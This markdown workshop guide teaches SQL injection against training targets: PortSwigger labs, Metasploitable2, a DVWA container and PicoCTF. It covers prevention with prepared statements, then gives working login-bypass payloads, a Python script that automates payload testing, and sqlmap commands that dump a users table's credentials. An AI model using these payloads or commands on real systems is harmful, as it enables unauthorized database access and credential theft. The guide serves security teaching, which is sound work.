# Hand-on SQL Injection Workshop :D

## Agenda

- SQL Injection in a Nutshell. => (Let's Take a Look! ><)

  - What is SQL Injection?
  - What are the types of SQL Injection?
  - How to prevent SQL Injection?

- SQL Injection in Action => (Let's Hack! ^^)

  - Practicing with PortSwigger SQL Injection Labs
    - Manual Exploitation via manipulating the URL for the GET request
    - Writing a Python Script to automate the exploitation process
  - Exploit MetaSpoitable2 VM
    - Security Level 0 => (No Protection) ==> Manual Exploitation via entering Payloads in the input fields
    - Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy** -> Talk here about the Zap Proxy and its features compared to Burp Suite
    - Security Level 2 => (Advanced Protection) ==> Show the secure code
  - Using SQL Map to make life easier
    - Setup Docker Container with Vulnerable Web Application
    - Exploit the Vulnerability with SQL Map
  - Solving CTF Challenges
    - PicoCTF SQL Injection
    - HackTheBox or TryHackMe Rooms

- Where should I go from here? => (Let's Learn More! ^\_^)
  - More Resources
    - Useful GitHub Repositories
    - Useful Cheat Sheets
    - Useful Articles
    - Useful Videos

---

## **Part 1: Let's Take a Look! ><**

### 1.1 What is SQL Injection?

SQL injection is a code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker). SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.

### 1.2 What are the types of SQL Injection?

- In-band SQL Injection
- Inferential SQL Injection
- Blind SQL Injection
- Error-based SQL Injection
- Union-based SQL Injection
- Boolean-based SQL Injection
- Time-based SQL Injection

### 1.3 How to prevent SQL Injection?

You can prevent SQL injection by using prepared statements. Prepared statements are SQL statements that are compiled and stored in the database. This means that the database can parse the statement and check its syntax before it is executed. This prevents SQL injection because the parameters are escaped before the query is executed. The following example shows how to use prepared statements to prevent SQL injection:

```sql
SELECT * FROM users WHERE username = ? AND password = ?
-- Here the ? is a placeholder for the username and password values that will be passed to the query.
-- The database will escape any special chars in the values and then execute the query.
```

Here is an example of how to use prepared statements in PHP:

```php
<?php
// Create a prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
// Get parameter values
$username = "admin";
$password = "password";
// Bind parameters to the query
$stmt->bind_param("ss", $username, $password);
// Execute the query
$stmt->execute();
// Get the result of the query
$result = $stmt->get_result();
// Do something with the result
?>
```

---

## **Part 2: Let's Hack It! ^^**

### 2.1 Practicing with [PortSwigger](https://portswigger.net/web-security/sql-injection) SQL Injection Labs

#### 2.1.1 Manual Exploitation via manipulating the URL

- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

> Actual SQL Query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

> SQL Payloads

```sql
'
'--

-- To display all the products (Released and Unreleased)
' OR 1=1 --
```

> URL after injection Payload
>
> > Notice URL encoding here.

```url
https://0a6c002a040e04efc00f4f2b00950098.web-security-academy.net/filter?category=Accessories%27+OR+1=1--
```

> SQL Statement behind the scene after injection

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

#### 2.1.2 Writing a Python Script to automate the exploitation process

```python
import requests
import sys
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for requests
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    """
    Exploits SQL injection vulnerability in web application.
    :param url: URL of the vulnerable web application.
    :param payload: SQL injection payload to be used.
    :return: True if SQL injection successful, False otherwise.
    """
    # Construct URL with payload
    uri = '/filter?category='
    r = requests.post(url + uri + payload, verify=False, proxies=proxies)

    # Check if payload was executed successfully
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    # Check if arguments are provided
    if len(sys.argv) < 3:
        print("[-] Usage: %s <url> <payloads_file>" % sys.argv[0])
        print('[-] Example: %s www.example.com payloads.txt' % sys.argv[0])
        sys.exit(-1)

    # Get target URL and payloads from file
    url = sys.argv[1].strip()
    payloads_file = sys.argv[2].strip()

    # Read payloads from file
    with open(payloads_file, 'r') as f:
        payloads = [line.strip() for line in f.readlines()]

    # Exploit SQL injection with each payload and print result
    successful = []
    unsuccessful = []
    for payload in payloads:
        if exploit_sqli(url, payload):
            successful.append(payload)
        else:
            unsuccessful.append(payload)
    print("[+] SQL injection successful with payloads: ")
    print("\n".join(successful))
    print("[-] SQL injection unsuccessful with payloads: ")
    print("\n".join(unsuccessful))
```

### 2.2 Exploit [MetaSpoitable2](http://192.168.8.164/mutillidae/index.php?page=login.php) VM

#### 2.2.1 Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields

- MySQL Payload

```sql
'
test' or 1=1 #
-- In username field only
khader' #
-- In password field only with any username
' OR 1=1 #
```

#### 2.2.2 Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**

- MySQL Payload

```sql
-- khader => should be edited in Zap
khader' #
-- kk
```

> Notes related to Zap Proxy
>
> > - Zap Configs in the Browser
> > - FoxyProxy Proxy Switcher
> > - Connect to Zap Proxy with Burp Suite
> > - Zap Spider and Crawler
> > - Zap Scanner
> > - Zap Breakpoints

#### 2.2.3 Security Level 2 => (Advanced Protection) ==> Show the secure code

### 2.3 Using SQL Map to make life easier

#### 2.3.1 Setup Docker Container with Vulnerable Web Application

```bash
sudo apt install docker.io
sudo systemctl status docker
docker run -d -p 80:80 vulnerables/web-dvwa
docker ps
```

#### 2.3.2 Exploit the Vulnerability with SQL Map

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low"
```

```bash
# Getting the databases
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --dbs

# Getting the tables from the database
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --batch -D dvwa --tables

# Getting the columns from the table
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --batch -D dvwa -T users --columns

# Dumping the data from the table
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" -D dvwa -T users -C user,password --dump
```

### 2.4 Solving CTF Challenges

#### 2.4.1 [PicoCTF](https://play.picoctf.org/practice/challenge/304?category=1) SQL Injection

- SQLiLite Challenge

  > Final SQL Payload... Find out the flag!

  ```sql
  admin' --
  ```

- Web Gauntlet Challenge
  > Final SQL Payload... Be care about filters in each round!
  ```sql
  ' OR 1=1 --
  ```

#### 2.4.2 HackTheBox || TryHackMe Rooms

- [HTB](https://www.hackthebox.eu/home/machines/profile/129)

- [THM](https://tryhackme.com/room/sqlinjection)

---

## **Part 3: Let's Learn More! ^\_^**

### My Resources

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/learning-path)

- [PicoCTF SQL Injection](https://picoctf.org/practice-questions)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQL Map Docs](https://github.com/sqlmapproject/sqlmap)
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

# Made with 💚 by Khaders
